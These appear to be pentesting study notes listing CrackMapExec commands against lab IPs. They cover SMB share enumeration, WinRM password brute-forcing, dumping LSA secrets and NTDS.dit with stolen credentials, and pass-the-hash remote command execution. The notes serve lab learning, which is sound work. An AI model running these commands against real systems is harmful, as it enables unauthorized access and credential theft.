#crackmapexec

#update

- Swiss army tool
- [GitHub - byt3bl33d3r/CrackMapExec: A swiss army knife for pentesting networks](https://github.com/byt3bl33d3r/CrackMapExec)
- `crackmapexec smb 10.129.14.128 --shares -u '' -p ''` enumerate smb shares
- `crackmapexec winrm 10.129.42.197 -u user.list -p password.list` cracks winrm passwords
- `crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares` list SMB shares
- `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa` drumping LSA secrets using stolen creds
- `crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds` grabbing NTDS.dit file from ADDC (must be an admin account)
- `crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami` command execution
- `crackmapexec smb 172.16.1.0/24 -u '' -p ''` scan entire subnet for smb shares